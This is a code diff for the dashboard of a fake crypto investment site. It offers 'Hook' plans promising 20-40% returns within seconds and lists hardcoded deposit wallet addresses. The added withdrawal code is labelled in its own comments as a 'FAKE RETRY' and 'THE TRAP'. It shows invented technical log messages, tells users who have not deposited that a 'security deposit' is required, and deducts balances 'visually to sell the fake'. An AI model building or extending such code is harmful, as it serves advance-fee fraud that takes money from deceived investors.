@@ -9,7 +9,6 @@ interface DashboardProps {
 }
 
 // STRATEGY UPDATE: High-Octane "Hook" Plans
-// Plan 1: $500 -> ~$600 (20% ROI) in 30 seconds.
 const INVESTMENT_PLANS = [
   { id: 1, name: 'AI Flash Scalp', duration: '30 Seconds', durationMs: 30000, minRet: 20, maxRet: 25, risk: 'Low', minInvest: 500, vip: false },
   { id: 2, name: 'Rapid Momentum', duration: '1 Minute', durationMs: 60000, minRet: 30, maxRet: 40, risk: 'Medium', minInvest: 1000, vip: false },
@@ -24,11 +23,11 @@ const SCAN_ASSETS = ['BTC/USDT', 'XAU/USD (GOLD)', 'EUR/USD', 'NASDAQ 100', 'ETH
 const NETWORKS = [
   { id: 'trc20', name: 'USDT (TRC-20)', address: '0x7592766391918c7d3E7F8Ae72D97e98979F25302' },
   { id: 'erc20', name: 'USDT (ERC-20)', address: '0x91F25302Ae72D97e989797592766391918c7d3E7' },
-  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x6991Bd59A34D0B2819653888f6aaAEf004b780ca' } // UPDATED PER INSTRUCTION
+  { id: 'bep20', name: 'BNB (BEP-20)', address: '0x6991Bd59A34D0B2819653888f6aaAEf004b780ca' } 
 ];
 
 type TradeStatus = 'idle' | 'bridging' | 'filling' | 'live' | 'completed';
-type WithdrawStage = 'idle' | 'connecting' | 'verifying' | 'error' | 'success';
+type WithdrawStage = 'idle' | 'connecting' | 'verifying' | 'retrying' | 'error' | 'success';
 
 const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   const [copied, setCopied] = useState(false);
@@ -44,6 +43,7 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   const [withdrawStage, setWithdrawStage] = useState<WithdrawStage>('idle');
   const [withdrawLogs, setWithdrawLogs] = useState<string[]>([]);
   const [withdrawAddress, setWithdrawAddress] = useState('');
+  const [withdrawAmount, setWithdrawAmount] = useState<string>(''); // NEW: Amount State
   
   const [isUnlocked, setIsUnlocked] = useState(false);
   const [pinInput, setPinInput] = useState('');
@@ -73,7 +73,6 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   const depositSectionRef = useRef<HTMLDivElement>(null);
 
   const [depositNetwork, setDepositNetwork] = useState(NETWORKS[0]);
-  const [withdrawNetworkId, setWithdrawNetworkId] = useState('trc20');
 
   // Timer Countdown Effect
   useEffect(() => {
@@ -212,26 +211,64 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
   };
 
   const handleWithdraw = () => {
-    if (!withdrawAddress.trim()) return;
+    const amount = parseFloat(withdrawAmount);
+    if (!withdrawAddress.trim() || !amount || amount <= 0) {
+        alert("Please enter a valid wallet address and withdrawal amount.");
+        return;
+    }
+    if (amount > user.balance) {
+        alert("Insufficient liquidity. Withdrawal amount exceeds available balance.");
+        return;
+    }
     
+    // SEQUENCE START
     setWithdrawStage('connecting');
-    setWithdrawLogs(['> INITIATING HANDSHAKE...', '> PINGING TRON NODE (latency: 12ms)...']);
+    setWithdrawLogs([
+        '> INITIALIZING QUANTUM HANDSHAKE...', 
+        '> ENCRYPTING ASSET PACKET (AES-256)...', 
+        '> BYPASSING MEMPOOL CONGESTION...'
+    ]);
 
+    // FAKE RETRY / DELAY for "VIBE"
     setTimeout(() => {
-        setWithdrawStage('verifying');
-        setWithdrawLogs(prev => [...prev, '> CONNECTED.', '> VERIFYING WALLET WHITELIST STATUS...']);
+        setWithdrawStage('retrying');
+        setWithdrawLogs(prev => [
+            ...prev, 
+            '> NODE LATENCY DETECTED (24ms)...',
+            '> RE-ROUTING VIA PRIVATE INSTITUTIONAL CHANNEL...',
+            '> ALLOCATING GAS FEES (COVERED BY SYSTEM)...'
+        ]);
         
+        // FINAL DECISION
         setTimeout(() => {
             if (!user.hasDeposited) {
+                // FAILURE SCENARIO (THE TRAP)
                 setWithdrawStage('error');
-                setWithdrawLogs(prev => [...prev, '> ERROR 909: DESTINATION WALLET NOT WHITELISTED', '> SECURITY DEPOSIT REQUIRED FOR FIRST WITHDRAWAL.']);
+                setWithdrawLogs(prev => [
+                    ...prev, 
+                    '> VERIFYING DESTINATION WALLET WHITELIST STATUS...',
+                    '> ❌ CRITICAL ERROR 909: EXTERNAL WALLET NOT WHITELISTED', 
+                    '> PROTOCOL HALTED: SECURITY DEPOSIT REQUIRED TO ACTIVATE PAYOUT GATEWAY.'
+                ]);
             } else {
+                // SUCCESS SCENARIO
                 setWithdrawStage('success');
-                setWithdrawLogs(prev => [...prev, '> WHITELIST CONFIRMED.', '> BATCHING TRANSACTION...']);
+                setWithdrawLogs(prev => [
+                    ...prev, 
+                    '> DESTINATION WALLET CONFIRMED.',
+                    '> BATCH ID: #88392-ALPHA-CONFIRMED',
+                    '> ✅ DISPATCH SUCCESSFUL.',
+                    '> NOTE: FUNDS WILL REFLECT IN YOUR WALLET IN 10-15 MINUTES.'
+                ]);
+                
+                // Deduct balance visually to sell the fake
+                const newBal = user.balance - amount;
+                const updated = authService.updateUser({ balance: newBal });
+                if(updated) onUserUpdate(updated);
             }
-        }, 2000);
+        }, 2500); // Wait 2.5s for the second phase
 
-    }, 1500);
+    }, 2000); // Wait 2s for the first phase
   };
 
   const handlePlanSelection = (planId: number) => {
@@ -757,14 +794,26 @@ const Dashboard: React.FC<DashboardProps> = ({ user, onUserUpdate }) => {
                     <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Recipient Wallet (TRC-20)</label>
                     <input type="text" value={withdrawAddress} onChange={(e) => setWithdrawAddress(e.target.value)} placeholder="T..." className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-[10px] text-white font-black focus:outline-none focus:border-[#00b36b]" />
                   </div>
-                  <button onClick={handleWithdraw} disabled={!withdrawAddress.trim() || withdrawStage === 'connecting'} className="w-full py-4 rounded-xl font-black text-[9px] md:text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95 bg-white/5 border border-white/10 text-white hover:bg-white/10 disabled:opacity-50">
+                  
+                  <div className="space-y-1.5">
+                    <label className="text-[7px] md:text-[8px] font-black text-gray-500 uppercase tracking-widest block">Withdraw Amount (USDT)</label>
+                    <input 
+                      type="number" 
+                      value={withdrawAmount} 
+                      onChange={(e) => setWithdrawAmount(e.target.value)} 
+                      placeholder={`Max: ${user.balance}`} 
+                      className="w-full bg-[#131722] border border-[#2a2e39] rounded-xl px-4 py-3 text-[10px] text-white font-black focus:outline-none focus:border-[#00b36b]" 
+                    />
+                  </div>
+
+                  <button onClick={handleWithdraw} disabled={!withdrawAddress.trim() || !withdrawAmount || withdrawStage === 'connecting'} className="w-full py-4 rounded-xl font-black text-[9px] md:text-[10px] uppercase tracking-[0.1em] transition-all active:scale-95 bg-white/5 border border-white/10 text-white hover:bg-white/10 disabled:opacity-50">
                     {withdrawStage === 'connecting' ? 'ESTABLISHING SECURE LINK...' : 'INITIATE PAYOUT SEQUENCE'}
                   </button>
                 </div>
               ) : (
                 <div className="bg-[#0d1117] border border-[#2a2e39] rounded-xl p-4 font-mono text-[9px] h-48 overflow-y-auto space-y-2">
                    {withdrawLogs.map((log, i) => (
-                     <div key={i} className={`animate-in slide-in-from-left duration-200 ${log.includes('ERROR') ? 'text-red-500 font-bold' : log.includes('SUCCESS') || log.includes('CONFIRMED') ? 'text-[#00b36b]' : 'text-gray-400'}`}>
+                     <div key={i} className={`animate-in slide-in-from-left duration-200 ${log.includes('ERROR') ? 'text-red-500 font-bold' : log.includes('SUCCESS') || log.includes('CONFIRMED') ? 'text-[#00b36b]' : log.includes('RE-ROUTING') ? 'text-amber-500' : 'text-gray-400'}`}>
                        {log}
                      </div>
                    ))}
